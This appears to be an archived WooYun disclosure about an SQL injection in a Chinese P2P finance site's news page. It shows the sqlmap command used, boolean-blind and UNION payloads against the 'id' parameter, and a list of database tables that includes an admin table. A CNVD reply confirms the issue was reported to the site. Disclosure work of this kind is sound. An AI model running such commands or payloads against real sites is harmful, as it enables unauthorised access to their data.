wybug_title: P2P安全之开元金融网站sql注入一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail: 漏洞详情 披露状态：   									2015-08-13：	细节已通知厂商并且等待厂商处理中									2015-08-14：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-08-24：	细节向核心白帽子及相关领域专家公开									2015-09-03：	细节向普通白帽子公开									2015-09-13：	细节向实习白帽子公开									2015-09-28：	细节向公众公开  简要描述： 一次浅尝辄止的测试，急缺wb，求助啊 详细说明：  伪静态注入，可参考之前的http://**.**.**.**/bugs/wooyun-2015-0114051http://**.**.**.**/news/details/id/32C:\Python27\sqlmap>sqlmap.py -u "http://**.**.**.**/news/details?id=32" --threads 5 --tables         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150415}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:02:27[17:02:27] [INFO] resuming back-end DBMS 'sqlite'[17:02:27] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=32) AND 6605=6605 AND (6814=6814    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: id=32) UNION ALL SELECT NULL,NULL,NULL,NULL,'qbqxq'||'qJOlObehoE'||'qpbkq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[17:02:29] [INFO] the back-end DBMS is SQLiteweb application technology: Apache 2.4.10back-end DBMS: SQLite[17:02:29] [INFO] fetching tables for database: 'SQLite_masterdb'Database: SQLite_masterdb[7 tables]+----------------------+| autochina_admin      || autochina_articles   || autochina_categories || autochina_job        || autochina_material   || autochina_source     || sqlite_sequence      |+----------------------+   漏洞证明：  同上   修复方案：  你们比我更专业   版权声明：转载请注明来源 anting@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-08-14 17:04 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向网站管理单位通报。 最新状态： 暂无
